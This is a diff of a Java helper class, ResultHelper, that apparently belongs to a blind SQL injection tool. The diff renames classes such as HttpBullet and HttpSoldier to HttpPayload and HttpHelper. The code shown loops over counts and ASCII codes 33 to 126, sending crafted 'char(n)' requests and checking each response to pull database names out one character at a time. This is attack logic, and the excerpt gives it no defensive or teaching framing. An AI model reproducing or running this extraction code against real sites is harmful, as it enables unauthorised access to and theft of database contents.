@@ -1,14 +1,14 @@
 /**
  * @ ResultHelper.java
  */
-package logic.result;
+package logic;
 
-import logic.domain.HttpBullet;
-import logic.domain.QueryCondition;
-import logic.domain.URLCondition;
-import logic.domain.UserValueCondition;
-import logic.http.HttpBulletFactory;
-import logic.http.HttpSoldier;
+import domain.HttpPayload;
+import domain.QueryCondition;
+import domain.URLCondition;
+import domain.UserValueCondition;
+import logic.HttpPayloadFactory;
+import logic.HttpHelper;
 
 /**
  * <pre>
@@ -23,13 +23,13 @@ import logic.http.HttpSoldier;
 public class ResultHelper {
 
 	private SuccessDecider decider = null;
-	private HttpSoldier httpSoldier = null;
-	private HttpBulletFactory factory = null;
+	private HttpHelper HttpHelper = null;
+	private HttpPayloadFactory factory = null;
 	
 	public ResultHelper() {
 		decider = new SuccessDecider();
-		httpSoldier = new HttpSoldier();
-		factory = new HttpBulletFactory();
+		HttpHelper = new HttpHelper();
+		factory = new HttpPayloadFactory();
 	}
 
 	public int getCount(QueryCondition qc, URLCondition uc, UserValueCondition cond){
@@ -44,9 +44,9 @@ public class ResultHelper {
 		int cnt = 0;
 		for(int i=0; i < until; i++){
 			qc.setCheckVal(i+"");
-			HttpBullet bullet = factory.getHttpBullet(qc, uc);
+			HttpPayload bullet = factory.getHttpPayload(qc, uc);
 			//System.out.println(bullet.getUrl());
-			String res = httpSoldier.send(bullet);
+			String res = HttpHelper.send(bullet);
 			//System.out.println(res);
 			if(decider.isSuccess(res, match)){
 				cnt = i;
@@ -62,8 +62,8 @@ public class ResultHelper {
 			for(int j=33; j < 127; j++){ //(search ascii 33~126)
 				qc.setDbNameIndex(i+1);  //이 것을 테이블이나 칼럼일 경우 어떻게 할 것인지...
 				qc.setCheckVal("char("+j+")");
-				HttpBullet bullet = factory.getHttpBullet(qc, uc);
-				String res = httpSoldier.send(bullet);
+				HttpPayload bullet = factory.getHttpPayload(qc, uc);
+				String res = HttpHelper.send(bullet);
 				
 				if(decider.isSuccess(res, cond.getMatch())){
 					//System.out.println("find !! at : " + j);
